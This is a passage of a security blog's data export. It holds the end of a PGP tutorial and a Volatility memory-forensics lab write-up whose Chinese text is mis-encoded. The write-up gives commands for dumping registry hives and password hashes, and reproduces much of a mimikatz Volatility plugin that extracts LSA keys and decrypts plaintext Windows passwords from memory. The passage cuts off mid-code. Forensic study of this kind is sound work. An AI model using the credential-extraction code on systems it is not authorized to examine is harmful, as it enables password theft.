æ³¨æ„ï¼šå¦‚æœæƒ³åŒæ—¶å¯¼å‡ºå…¬é’¥å’Œç§é’¥ï¼Œå°±æŠŠâ€œInclude Private Keyï¼ˆsï¼‰â€é€‰ä¸Šã€‚å¦‚æœåªæƒ³å¯¼å‡ºå…¬é’¥ç»™åˆ«äººåŠ å¯†ä½¿ç”¨ï¼Œåƒä¸‡ä¸èƒ½é€‰ä¸Šã€‚ å››ã€æ–‡ä»¶åŠ å¯†ä¸è§£å¯† è‹¥karlieæƒ³ç»™Lichunquanå‘é€åŠ å¯†æ–‡ä»¶ï¼Œåˆ™ä»â€œå…¬é’¥ç®¡ç†â€æ–‡ä»¶å¤¹è·å–LiChunquançš„å…¬é’¥ï¼Œå³LiChunquan.ascï¼Œæ”¾åˆ°æŒ‡å®šçš„ä½ç½®ï¼Œç„¶ååŒå‡»è¿™ä¸ªå…¬é’¥æ–‡ä»¶ï¼Œç‚¹å‡»â€œImportâ€ï¼Œå³å°†è¿™ä¸ªæ–‡ä»¶å¯¼å…¥åˆ°å¯†é’¥ç›˜ä¸Šã€‚ Karlieç”¨Lichunquançš„å…¬é’¥å°†ä¸€ä¸ªæ–‡ä»¶åŠ å¯†,ä¾‹å¦‚æ–‡ä»¶â€œText.txtâ€ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š åœ¨èœå•æ å·¦ä¾§ï¼Œé€‰æ‹©PGPZIPâ†’ å»ºç«‹æ–°çš„é¡¹ç›® â€‹ â†’ å°†éœ€è¦åŠ å¯†çš„æ–‡ä»¶æ‹–å…¥ â€‹ â†’é€‰æ‹©Lichunquançš„å…¬é’¥ â€‹ â†’ è¿›è¡ŒåŠ å¯†å’Œç­¾å â€‹ â†’ åŠ å¯†å®Œæˆåå¾—åˆ°text.txt.pgp æ–‡ä»¶ Karlieé€šè¿‡é€šä¿¡è½¯ä»¶ï¼Œå°†åŠ å¯†æ–‡ä»¶â€œtext.txt.pgpâ€å‘é€ç»™Lichunquanã€‚ Lichunquanæ”¶åˆ°æ–‡ä»¶åï¼Œåˆ©ç”¨è‡ªå·±çš„ç§é’¥å°†æ–‡ä»¶è§£å¯†ã€‚ äº”ã€æ•°å­—ç­¾å å¯¹æ–‡ä»¶ç­¾ååªèƒ½è¯æ˜æ˜¯ä½ å‘å‡ºè¯¥æ–‡ä»¶ï¼Œä½†æ˜¯æ–‡ä»¶çš„å†…å®¹å¹¶æ²¡æœ‰è¢«åŠ å¯†ï¼ŒåŒæ—¶ï¼Œè¿›è¡Œæ•°å­—ç­¾åæ—¶ï¼Œå…³æ³¨çš„æ˜¯è¡¨æ˜è¯¥æ–‡ä»¶æ˜¯ä»è‡ªå·±è¿™é‡Œå‘å‡ºï¼Œå› æ­¤å¯¹äºæ–‡ä»¶çš„å†…å®¹å¹¶ä¸åœ¨æ„è¢«åˆ«äººçœ‹åˆ°ï¼Œç»è¿‡æ•°å­—ç­¾åçš„æ–‡ä»¶è¦åŒåŸæ˜æ–‡æ–‡ä»¶ä¸€åŒå‘é€ç»™å¯¹æ–¹ï¼Œå¯¹æ–¹æ‰èƒ½éªŒè¯æ•°å­—ç­¾åæ˜¯å¦æœ‰æ•ˆã€‚ æ•°å­—ç­¾åï¼ˆdigital signatureï¼‰æ˜¯å…¬é’¥å¯†ç çš„é€†åº”ç”¨ï¼šç”¨ç§é’¥åŠ å¯†æ¶ˆæ¯ï¼Œç”¨å…¬é’¥è§£å¯†æ¶ˆæ¯ã€‚ ç”¨ç§é’¥åŠ å¯†çš„æ¶ˆæ¯ç§°ä¸ºç­¾åï¼Œåªæœ‰æ‹¥æœ‰ç§é’¥çš„ç”¨æˆ·å¯ä»¥ç”Ÿæˆç­¾åã€‚ç”¨å…¬é’¥è§£å¯†ç­¾åè¿™ä¸€æ­¥ç§°ä¸ºéªŒè¯ç­¾åï¼Œæ‰€æœ‰ç”¨æˆ·éƒ½å¯ä»¥éªŒè¯ç­¾å(å› ä¸ºå…¬é’¥æ˜¯å…¬å¼€çš„) åœ¨èœå•æ å·¦ä¾§ï¼Œé€‰æ‹©PGPZIPâ†’ å»ºç«‹æ–°çš„é¡¹ç›® â†’ å°†éœ€è¦ç­¾åçš„æ–‡ä»¶æ‹–å…¥ â€‹ â†’ é€‰æ‹©sign onlyï¼Œåªè¿›è¡Œç­¾å â€‹ â†’ ç”¨è‡ªå·±çš„ç§é’¥è¿›è¡Œç­¾å â†’ è·å¾—ç­¾åæ–‡ä»¶â€œtext.txt.sigâ€œ â€‹ Karlieé€šè¿‡é€šä¿¡è½¯ä»¶ï¼Œå°†åŸæ–‡ä»¶â€œtext.txtâ€å’Œç­¾åæ–‡ä»¶â€œtext.txt.sigâ€å‘é€ç»™LiChunquanã€‚ LiChunquanä»â€œå…¬é’¥ç®¡ç†â€æ–‡ä»¶å¤¹è·å–Karlieçš„å…¬é’¥ï¼Œå³lijingyi.ascï¼Œç„¶ååŒå‡»è¿™ä¸ªå…¬é’¥æ–‡ä»¶ï¼Œç‚¹å‡»â€œImportâ€ï¼Œå³å°†è¿™ä¸ªæ–‡ä»¶å¯¼å…¥åˆ°å¯†é’¥ç›˜ä¸Šã€‚ â†’ å¯¼å…¥Karlieçš„å…¬é’¥ä»¥åï¼Œæ‰“å¼€PGP Desktopï¼Œé€‰æ‹©â€œAll Keysâ€ â†’å³é”®å•å‡»â€œKarlieâ€â†’é€‰æ‹©â€œSignâ€ï¼ˆä½¿â€œKarlieâ€çš„â€œVerifiedâ€çŠ¶æ€å˜ä¸ºâ€œâœ”â€ï¼‰ã€‚ â†’ LiChunquanå°†ä¸¤ä¸ªæ–‡ä»¶æ”¾åœ¨åŒä¸€ç›®å½•ä¸‹ï¼ŒåŒå‡»ç­¾åæ–‡ä»¶â€œtext.txt.sigâ€å³å¯éªŒè¯ç­¾åã€‚","categories":[{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"å¯†ç å­¦","slug":"å®éªŒ/å¯†ç å­¦","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"PGP","slug":"PGP","permalink":"https://gryffinbit.top/tags/PGP/"},{"name":"å…¬é’¥ä½“åˆ¶","slug":"å…¬é’¥ä½“åˆ¶","permalink":"https://gryffinbit.top/tags/%E5%85%AC%E9%92%A5%E4%BD%93%E5%88%B6/"}],"author":"Gryffinbit"},{"title":"kaliä¸‹volatilityå–è¯å·¥å…·çš„ä½¿ç”¨","slug":"kaliä¸‹volatilityå–è¯å·¥å…·çš„ä½¿ç”¨","date":"2020-12-05T18:20:24.000Z","updated":"2024-11-12T06:59:31.000Z","comments":true,"path":"2020/12/06/kaliä¸‹volatilityå–è¯å·¥å…·çš„ä½¿ç”¨/","permalink":"https://gryffinbit.top/2020/12/06/kali%E4%B8%8Bvolatility%E5%8F%96%E8%AF%81%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"","text":"Kaliä¸‹ volatilityå–è¯è½¯ä»¶çš„ä½¿ç”¨å®éªŒæ‰€ç”¨é™„ä»¶ä¸‹è½½https://gryffinbit.lanzous.com/b01bwm4abå¯†ç :15j0 å®éªŒç¯å¢ƒï¼šDebian 8 kali å®éªŒè¦æ±‚ï¼šä½¿ç”¨Volatility å–è¯è½¯ä»¶ä»å†…å­˜è½¬å‚¨æ–‡ä»¶ä¸­è·å–æœ‰ç”¨ä¿¡æ¯ï¼ŒåŒ…æ‹¬: æŸ¥çœ‹å†…å­˜é•œåƒä¸­è¿›ç¨‹åˆ—è¡¨ æŸ¥çœ‹å†…å­˜é•œåƒä¸­æ³¨å†Œè¡¨ä¿¡æ¯ è·å–ç”¨æˆ·åå’Œç”¨æˆ·ç™»é™†å¯†ç  æŸ¥çœ‹è½¬å‚¨å‰éƒ½è¿è¡Œäº†å“ªäº›ç¨‹åº æŠŠæŸä¸ªç¨‹åºçš„ç›¸å…³æ•°æ®è½¬å‚¨æˆ-ä¸€ä¸ªæ–‡ä»¶ï¼Œå¯¹è¿™ä¸ªæ–‡ä»¶è¿›è¡Œè¿›ä¸€æ­¥åˆ†æ æå–ç›®æ ‡ç³»ç»Ÿçš„å‘½ä»¤è¡Œå†å² æå–ç›®æ ‡ç³»ç»Ÿçš„ç½‘ç»œè¿æ¥æƒ…å†µ æå–ç›®æ ‡ç³»ç»Ÿçš„ä½¿ç”¨IEæµè§ˆå™¨è®¿é—®ç½‘ç»œæƒ…å†µ å®éªŒå†…å®¹ï¼š é¦–å…ˆä½¿ç”¨å†…å®¹è½¬å‚¨è½¯ä»¶dumpitåœ¨Windows7è™šæ‹Ÿæœº(ç›®æ ‡ç³»ç»Ÿ)ä¸­å°†å†…å­˜ä¸­æ‰€æœ‰ä¿¡æ¯è½¬å‚¨ä¸º-ä¸€ä¸ªæ–‡ä»¶ã€‚ å°†è½¬å‚¨ç”Ÿæˆçš„æ–‡ä»¶æ‹·è´åˆ°Kaliç³»ç»Ÿä¸­è¿›è¡Œåˆ†æã€‚ å®éªŒè¿‡ç¨‹ï¼švolatilityå®˜æ–¹æ–‡æ¡£ https://github.com/volatilityfoundation/volatility/wiki/Installation åŸºæœ¬ä¾èµ–åŒ…åŠç¯å¢ƒé…ç½® ğŸ‘‰ä¸‹è½½volatility git clone [https://github.com/volatilityfoundation/volatility.git](https://github.com/volatilityfoundation/volatility.git) è§£å‹è¯¥å‹ç¼©åŒ…ï¼Œcdåˆ°æ–‡ä»¶å¤¹ä½ç½®ï¼Œè¿è¡Œå®‰è£…è„šæœ¬ python [setup.py](http://setup.py) build python [setup.py](http://setup.py) install ç”¨æ³• 123cd /root/volatility/chmod +x vol.py./vol.py ç¼ºå°‘ä¾èµ–åŒ… ğŸ‘‰pip å®‰è£…ç¼ºå°‘çš„ä¾èµ–åŒ… 12345sudo pip install yarapip install distorm3==3.4.4sudo pip install pycrypto sudo pip install openpyxl sudo pip install Pillow å†…å­˜å·¥å…·Dumpçš„ä½¿ç”¨ ğŸ‘‰è¿›è¡Œè½¬å‚¨ ğŸ‘‰åˆ¶å¤‡å®éªŒç”¨çš„è½¬å‚¨æ–‡ä»¶ åœ¨ç›®æ ‡ç³»ç»Ÿä¸­æ‰“å¼€ä¸€äº›åº”ç”¨ç¨‹åºï¼Œä¾‹å¦‚ï¼šè®°äº‹æœ¬ ä½¿ç”¨kaliåˆ†æè½¬å‚¨ç”Ÿæˆçš„æ–‡ä»¶ ğŸ‘‰æŸ¥çœ‹å¸®åŠ©æ–‡æ¡£ ğŸ‘‰åˆ†æç³»ç»Ÿä¿¡æ¯ ğŸ‘‰ä½¿ç”¨pslistæŸ¥çœ‹å†…å­˜é•œåƒä¸­è¿›ç¨‹åˆ—è¡¨ 1python vol.py -f /root/æ¡Œé¢/suspicion/mem.vmem --profile=WinXPSP2x86 pslist ğŸ‘‰ä½¿ç”¨hiveliestæŸ¥çœ‹å†…å­˜ä¸­ç¼“å­˜çš„æ³¨å†Œè¡¨ä¿¡æ¯ï¼Œä¾‹å¦‚æ‰€æœ‰ç”¨æˆ·åã€å¯†ç hashã€ç—…æ¯’éšè—ã€æ¶æ„å¯åŠ¨é¡¹ã€æ˜ å°„åŠ«æŒã€‚ç­‰ 12python [vol.py](http://vol.py/) -f /root/æ¡Œé¢/suspicion/mem.vmem --profile=WinXPSP2x86 hivelistVolatility Foundation Volatility Framework 2.6.1 ğŸ‘‰hivedumpå¯ä»¥æŸ¥çœ‹hivelistä¸­åˆ—å‡ºçš„æ‰€æœ‰æ–‡ä»¶å†…å®¹ hivedump -o offset -oçš„åé¢ä¼ é€’ä¸€ä¸ªoffsetåç§»é‡å‚æ•°ã€‚æ˜¯è™šåœ°å€ï¼ˆå†…å­˜åœ°å€ï¼‰ 1python vol.py -f /root/æ¡Œé¢/suspicion/mem.vmem --profile=WinXPSP2x86 hivedump -o 0xe16aab60 ğŸ‘‰æŸ¥çœ‹æ³¨å†Œè¡¨ä¸­çš„æŸä¸€é¡¹å¥å€¼ printkey -K è·¯å¾„ 1python vol.py -f /root/æ¡Œé¢/suspicion/mem.vmem --profile=WinXPSP2x86 printkey -K &quot;SAM\\Domains\\Account\\Users\\Names&quot; ğŸ‘‰Winlogonå¥å€¼æŸ¥è¯¢åœ¨å†…å­˜è½¬å‚¨å‰ï¼Œæœ€åç™»å½•çš„è´¦æˆ·æ˜¯å“ªä¸ª 1python vol.py -f /root/æ¡Œé¢/suspicion/mem.vmem --profile=WinXPSP2x86 printkey -K &quot;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&quot; ğŸ‘‰å–å¾—ç”¨æˆ·å¯†ç çš„å“ˆå¸Œå€¼ hashdump -y systemçš„åç§»é‡ -s SAMçš„åç§»é‡ 1python vol.py -f /root/æ¡Œé¢/suspicion/mem.vmem --profile=WinXPSP2x86 hashdump -y 0xe1035b60 -s 0xe16aab60 è¿™æ­¥å¤±è´¥äº†ï¼Œæ²¡æœ‰æå–å‡ºæ¥å¯†ç çš„hash ğŸ‘‰ä½¿ç”¨mimikatzæ’ä»¶ï¼Œè·å–ç”¨æˆ·æ˜æ–‡å¯†ç  1sudo pip install construct==2.5.5-reupload mimikatz.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625# Volatility mimikatz plugin## Based on the research made by Gentil_Kiwi for his mimikatz# http://blog.gentilkiwi.com/mimikatz# https://code.google.com/p/mimikatz/## Author: Francesco Picasso &lt;francesco.picasso@gmail.com&gt;## This plugin is free software; you can redistribute it and/or modify# it under the terms of the GNU General Public License as published by# the Free Software Foundation; either version 2 of the License, or# (at your option) any later version.## This plugin is distributed in the hope that it will be useful,# but WITHOUT ANY WARRANTY; without even the implied warranty of# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the# GNU General Public License for more details.## You should have received a copy of the GNU General Public License# along with this plugin. If not, see &lt;http://www.gnu.org/licenses/&gt;.&quot;&quot;&quot;@author : Francesco Picasso@license : GPL 2 or later@contact : francesco.picasso@gmail.com@organization : www.realitynet.it&quot;&quot;&quot;import constructimport osimport reimport structimport volatility.obj as objimport volatility.debug as debugimport volatility.commands as commandsimport volatility.constants as constantsimport volatility.utils as utilsimport volatility.win32.tasks as tasksfrom Crypto.Cipher import AESfrom Crypto.Cipher import DES3#------------------------------------------------------------------------------class Credential(): &quot;&quot;&quot;TODO: add description here.&quot;&quot;&quot; def __init__(self, module=&#x27;&#x27;, username=&#x27;&#x27;, domain=&#x27;&#x27;, epwd=&#x27;&#x27;, pwd=&#x27;&#x27;): self.module = module self.username = username self.domain = domain self.epwd = epwd self.pwd = pwd self.signature = module + username + domain + epwd.encode(&#x27;hex&#x27;) def decrypt_epwd(self, decryptor): if self.epwd and decryptor: self.pwd = decryptor.decrypt(self.epwd) try: self.pwd = self.pwd.decode(&#x27;utf-16-le&#x27;).rstrip(&#x27;\\0&#x27;) except UnicodeDecodeError: debug.warning(&#x27;[Credential:decrypt_epwd] unicode decode error&#x27;) self.pwd = self.pwd.encode(&#x27;hex&#x27;) def dump(self): debug.notice(&#x27;m&lt;&#123;&#125;&gt; u&lt;&#123;&#125;&gt; d&lt;&#123;&#125;&gt; ep&lt;&#123;&#125;&gt; p&lt;&#123;&#125;&gt;&#x27;.format( self.module, self.username, self.domain, self.epwd.encode(&#x27;hex&#x27;), self.pwd))class Credentials(): &quot;&quot;&quot;TODO: add description here.&quot;&quot;&quot; def __init__(self): self.credentials = [] def add_credential(self, credential): already_in = False for cred in self.credentials: if cred.signature == credential.signature: already_in = True if not already_in: self.credentials.append(credential)#------------------------------------------------------------------------------class MemoryScanner(object): &quot;&quot;&quot;An address space scanner based on scudette&#x27;s Yara Scanner&quot;&quot;&quot; def __init__(self, task): self.task = task def _find_first(self, address_space, offset, maxlen, signature): &quot;&quot;&quot;Raw memory scanner with overlap.&quot;&quot;&quot; # Allow some bytes for overlapping signatures overlap = 1024 i = offset while i &lt; offset + maxlen: to_read = min( constants.SCAN_BLOCKSIZE + overlap, offset + maxlen - i) block = address_space.zread(i, to_read) if block: match = block.find(signature) if match &gt;= 0: return match i += constants.SCAN_BLOCKSIZE def find_first(self, offset, signature): &quot;&quot;&quot;Find the first match using VADs. It retuns a VA.&quot;&quot;&quot; task_as = self.task.get_process_address_space() task_vads = self.task.get_vads(skip_max_commit = True) for vad, __ in task_vads: if offset &gt;= vad.Start and offset &lt;= vad.Start + vad.Length: position = self._find_first(task_as, vad.Start, vad.Length, signature) if position: return position + vad.Start#------------------------------------------------------------------------------class MimikatzBase(object): &quot;&quot;&quot;The mimikatz base class, used to defined common attributes/methods.&quot;&quot;&quot; SIZEOF_LONG = 4 SIZEOF_PTR = None UNPACK_PTR = None UNPACK_LONG = &#x27;&lt;L&#x27; def __init__(self, task): self.task = task self.task_as = task.get_process_address_space() def get_ptr(self, pos): raw_data = self.task_as.zread(pos, self.SIZEOF_PTR) if raw_data: return struct.unpack(self.UNPACK_PTR, raw_data)[0] def get_data(self, pos, size): if pos and size: return self.task_as.zread(pos, size) return &#x27;&#x27;class Mimikatz_x86(MimikatzBase): &quot;&quot;&quot;The mimikatz x86 base class.&quot;&quot;&quot; SIZEOF_PTR = 4 UNPACK_PTR = &#x27;&lt;L&#x27; def __init__(self, task): MimikatzBase.__init__(self, task) MimikatzBase.__init__(self, task) def get_ptr_with_offset(self, pos): return self.get_ptr(pos)class Mimikatz_x64(MimikatzBase): &quot;&quot;&quot;The mimikatz x64 base class.&quot;&quot;&quot; SIZEOF_PTR = 8 UNPACK_PTR = &#x27;&lt;Q&#x27; def __init__(self, task): MimikatzBase.__init__(self, task) def get_ptr_with_offset(self, pos): raw_data = self.task_as.zread(pos, self.SIZEOF_LONG) if raw_data: ptr = struct.unpack(self.UNPACK_LONG, raw_data)[0] return pos + self.SIZEOF_LONG + ptr #------------------------------------------------------------------------------ class LsaDecryptor(): &quot;&quot;&quot;TODO: add description.&quot;&quot;&quot; SIGNATURE = None IV_LENGTH = 16 PTR_IV_OFFSET = None PTR_AES_KEY_OFFSET = None PTR_DES_KEY_OFFSET = None UUUR_TAG = 0x55555552 MSSK_TAG = 0x4d53534b HARD_KEY = construct.Struct(&#x27;KIWI_HARD_KEY&#x27;, construct.ULInt32(&#x27;cbSecret&#x27;), construct.Field(&#x27;data&#x27;, lambda ctx: ctx.cbSecret)) # Modified to include HARD_KEY size. BCRYPT_KEY = construct.Struct(&#x27;KIWI_BCRYPT_KEY&#x27;, construct.ULInt32(&#x27;size&#x27;), construct.ULInt32(&#x27;tag&#x27;), # &#x27;MSSK&#x27;. construct.ULInt32(&#x27;type&#x27;), construct.ULInt32(&#x27;unk0&#x27;), construct.ULInt32(&#x27;unk1&#x27;), construct.ULInt32(&#x27;unk2&#x27;), construct.ULInt32(&#x27;cbSecret&#x27;)) def __init__(self): self.iv = &#x27;&#x27; self.aes_key = &#x27;&#x27; self.des_key = &#x27;&#x27; def find_signature(self): for mod in self.task.get_load_modules(): if str(mod.BaseDllName).lower() == &#x27;lsasrv.dll&#x27;: scanner = MemoryScanner(self.task) return scanner.find_first(mod.DllBase.v(), self.SIGNATURE) debug.warning(&#x27;[LsaDecryptor:find_signature()] signature not found!&#x27;) def get_IV(self, pos): ptr_iv = self.get_ptr_with_offset(pos + self.PTR_IV_OFFSET) if ptr_iv: return self.get_data(ptr_iv, self.IV_LENGTH) def get_key(self, pos, key_offset): ptr_key = self.get_ptr_with_offset(pos + key_offset) if ptr_key: ptr_key = self.get_ptr(ptr_key) if ptr_key: size = self.BCRYPT_HANDLE_KEY.sizeof() data = self.get_data(ptr_key, size) if data: kbhk = self.BCRYPT_HANDLE_KEY.parse(data) if kbhk.tag == self.UUUR_TAG: ptr_key = kbhk.ptr_kiwi_bcrypt_key size = self.BCRYPT_KEY.sizeof() data = self.get_data(ptr_key, size) if data: kbk = self.BCRYPT_KEY.parse(data) if kbk.tag == self.MSSK_TAG: adjust = construct.ULInt32(&#x27;&#x27;).sizeof() size = kbk.cbSecret + adjust ptr_key = ptr_key + self.BCRYPT_KEY.sizeof() - adjust data = self.get_data(ptr_key, size) if data: khk = self.HARD_KEY.parse(data) return khk.data else: debug.warning(&#x27;get_key() unable to get HARD_KEY.&#x27;) else: debug.warning(&#x27;get_key() BCRYPT_KEY invalid tag&#x27;) else: debug.warning(&#x27;get_key() unable to read BCRYPT_KEY data.&#x27;) else: debug.warning(&#x27;get_key() BCRYPT_HANDLE_KEY invalid tag&#x27;) debug.warning(kbhk) else: debug.warning(&#x27;get_key() unable to read BCRYPT_HANDLE_KEY data.&#x27;) else: debug.warning(&#x27;get_key() unable to get BCRYPT_HANDLE_KEY pointer.&#x27;) else: debug.warning(&#x27;get_key()unable to get first pointer.&#x27;) def get_des_key(self, pos): return self.get_key(pos, self.PTR_DES_KEY_OFFSET) def get_aes_key(self, pos): return self.get_key(pos, self.PTR_AES_KEY_OFFSET) def acquire_crypto_material(self): sigpos = self.find_signature() if not sigpos: debug.warning(&#x27;[LsaDecryptor] unable to find signature!&#x27;) return self.iv = self.get_IV(sigpos) self.des_key = self.get_des_key(sigpos) self.aes_key = self.get_aes_key(sigpos) def decrypt(self, encrypted): # TODO: NT version specific, move from here in subclasses. cleartext = &#x27;&#x27; size = len(encrypted) if size: if size % 8: if not self.aes_key or not self.iv: return cleartext cipher = AES.new(self.aes_key, AES.MODE_CBC, self.iv) else: if not self.des_key or not self.iv: return cleartext cipher = DES3.new(self.des_key, DES3.MODE_CBC, self.iv[:8]) cleartext = cipher.decrypt(encrypted) return cleartext def dump(self): print &#x27;Dumping LSA Decryptor&#x27; print &#x27; IV (&#123;&#125;): &#123;&#125;&#x27;.format(len(self.iv), self.iv.encode(&#x27;hex&#x27;)) print &#x27;DES_KEY (&#123;&#125;): &#123;&#125;&#x27;.format( len(self.des_key), self.des_key.encode(&#x27;hex&#x27;)) print &#x27;AES_KEY (&#123;&#125;): &#123;&#125;&#x27;.format( len(self.aes_key), self.aes_key.encode(&#x27;hex&#x27;)) class LsaDecryptor_x86(LsaDecryptor, Mimikatz_x86): &quot;&quot;&quot;TODO: add description.&quot;&quot;&quot; def __init__(self, lsass_task): Mimikatz_x86.__init__(self, lsass_task) LsaDecryptor.__init__(self)class LsaDecryptor_x64(LsaDecryptor, Mimikatz_x64): &quot;&quot;&quot;TODO: add description.&quot;&quot;&quot; def __init__(self, lsass_task): Mimikatz_x64.__init__(self, lsass_task) LsaDecryptor.__init__(self)class LsaDecryptor_Vista_x86(LsaDecryptor_x86): &quot;&quot;&quot;Class for Windows Vista x86.&quot;&quot;&quot; # MIMIKATZ x86: BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[] SIGNATURE = &#x27;\\x8b\\xf0\\x3b\\xf3\\x7c\\x2c\\x6a\\x02\\x6a\\x10\\x68&#x27; PTR_IV_OFFSET = 11; PTR_AES_KEY_OFFSET = -15; PTR_DES_KEY_OFFSET = -70; BCRYPT_HANDLE_KEY = construct.Struct(&#x27;KIWI_BCRYPT_HANDLE_KEY&#x27;, construct.ULInt32(&#x27;size&#x27;), construct.ULInt32(&#x27;tag&#x27;), # Tag &#x27;UUUR&#x27;, 0x55555552. construct.ULInt32(&#x27;ptr_void_algorithm&#x27;), construct.ULInt32(&#x27;ptr_kiwi_bcrypt_key&#x27;), construct.ULInt32(&#x27;ptr_unknown&#x27;)) def __init__(self, lsass_task): LsaDecryptor_x86.__init__(self, lsass_task)class LsaDecryptor_Win7_x86(LsaDecryptor_x86): &quot;&quot;&quot;Class for Windows 7 x86.&quot;&quot;&quot; # MIMIKATZ x86: BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[] SIGNATURE = &#x27;\\x8b\\xf0\\x3b\\xf3\\x7c\\x2c\\x6a\\x02\\x6a\\x10\\x68&#x27; PTR_IV_OFFSET = 11; PTR_AES_KEY_OFFSET = -15; PTR_DES_KEY_OFFSET = -70; BCRYPT_HANDLE_KEY = construct.Struct(&#x27;KIWI_BCRYPT_HANDLE_KEY&#x27;, construct.ULInt32(&#x27;size&#x27;), construct.ULInt32(&#x27;tag&#x27;), # Tag &#x27;UUUR&#x27;, 0x55555552. construct.ULInt32(&#x27;ptr_void_algorithm&#x27;), construct.ULInt32(&#x27;ptr_kiwi_bcrypt_key&#x27;), construct.ULInt32(&#x27;ptr_unknown&#x27;)) def __init__(self, lsass_task): LsaDecryptor_x86.__init__(self, lsass_task)class LsaDecryptor_Vista_x64(LsaDecryptor_x64): &quot;&quot;&quot;Class for Vista x64.&quot;&quot;&quot; SIGNATURE = &#x27;\\x83\\x64\\x24\\x30\\x00\\x44\\x8b\\x4c\\x24\\x48\\x48\\x8b\\x0d&#x27; PTR_IV_OFFSET = 63; PTR_AES_KEY_OFFSET = 25; PTR_DES_KEY_OFFSET = -69; BCRYPT_HANDLE_KEY = construct.Struct(&#x27;KIWI_BCRYPT_HANDLE_KEY&#x27;, construct.ULInt32(&#x27;size&#x27;), construct.ULInt32(&#x27;tag&#x27;), # Tag &#x27;UUUR&#x27;, 0x55555552. construct.ULInt64(&#x27;ptr_void_algorithm&#x27;), construct.ULInt64(&#x27;ptr_kiwi_bcrypt_key&#x27;), construct.ULInt64(&#x27;ptr_unknown&#x27;)) def __init__(self, lsass_task): LsaDecryptor_x64.__init__(self, lsass_task)class LsaDecryptor_Win7_x64(LsaDecryptor_x64): &quot;&quot;&quot;Class for Windows 7 x64.&quot;&quot;&quot; # MIMIKATZ x64: BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[] SIGNATURE = &#x27;\\x83\\x64\\x24\\x30\\x00\\x44\\x8b\\x4c\\x24\\x48\\x48\\x8b\\x0d&#x27; PTR_IV_OFFSET = 59; PTR_AES_KEY_OFFSET = 25; PTR_DES_KEY_OFFSET = -61; BCRYPT_HANDLE_KEY = construct.Struct(&#x27;KIWI_BCRYPT_HANDLE_KEY&#x27;, construct.ULInt32(&#x27;size&#x27;), construct.ULInt32(&#x27;tag&#x27;), # Tag &#x27;UUUR&#x27;, 0x55555552. construct.ULInt64(&#x27;ptr_void_algorithm&#x27;), construct.ULInt64(&#x27;ptr_kiwi_bcrypt_key&#x27;), construct.ULInt64(&#x27;ptr_unknown&#x27;)) def __init__(self, lsass_task): LsaDecryptor_x64.__init__(self, lsass_task)#------------------------------------------------------------------------------ class Wdigest(): &quot;&quot;&quot;TODO: add description.&quot;&quot;&quot; SIGNATURE = None FIRST_ENTRY_OFFSET = 0 WDIGEST_LIST_ENTRY = None MODULE_NAME = &#x27;wdigest&#x27; MAX_WALK = 32 def __init__(self, credentials_obj): self.entries = [] self.entries_seen = &#123;&#125; self.credentials_obj = credentials_obj def find_signature(self): for mod in self.task.get_load_modules(): if str(mod.BaseDllName).lower() == &#x27;wdigest.dll&#x27;: scanner = MemoryScanner(self.task) return scanner.find_first(mod.DllBase.v(), self.SIGNATURE) debug.warning(&#x27;[Wdigest] no wdigest.dll found in lsass process!&#x27;) def get_entry_at(self, ptr): if ptr: size = self.WDIGEST_LIST_ENTRY.sizeof() data = self.get_data(ptr, size) if data: entry = self.WDIGEST_LIST_ENTRY.parse(data) return entry def get_first_entry(self): position = self.find_signature() if position: ptr_entry = self.get_ptr_with_offset(position + self.FIRST_ENTRY_OFFSET) if ptr_entry: ptr_entry = self.get_ptr(ptr_entry) if ptr_entry: entry = self.get_entry_at(ptr_entry) if entry: return entry, ptr_entry else: debug.warning(&#x27;[Wdigest] no wdigest package found.&#x27;) return None, None def get_unicode_string_at(self, ptr, size): data = self.get_data(ptr, size) if data: data_str = &#x27;&#x27; try: data_str = data.decode(&#x27;utf-16-le&#x27;).rstrip(&#x27;\\0&#x27;) except UnicodeDecodeError as ee: debug.error( &#x27;[Wdigest] get_unicode_string_at() unicode error &#123;&#125;&#x27;.format( ee)) debug.warning(&#x27;[Wdigest] src data is &lt;&#123;&#125;&gt;&#x27;.format(data_str)) return data_str else: debug.error(&#x27;[Wdigest] get_unicode_string_at() unable to get data&#x27;) return &#x27;&#x27; def add_entry(self, entry, found_at): if entry.usage_count: if entry.this_entry == found_at: user = domain = epwd = &#x27;&#x27; if entry.user_string_ptr and entry.user_len: user = self.get_unicode_string_at( entry.user_string_ptr, entry.user_max_len) if entry.domain_string_ptr and entry.domain_len: domain = self.get_unicode_string_at( entry.domain_string_ptr, entry.domain_max_len) if entry.password_encrypted_ptr and entry.password_len: epwd = data = self.get_data( entry.password_encrypted_ptr, entry.password_max_len) if user: cred_entry = Credential(self.MODULE_NAME, user, domain, epwd) self.credentials_obj.add_credential(cred_entry) def walk_entries(self): entry, found_at = 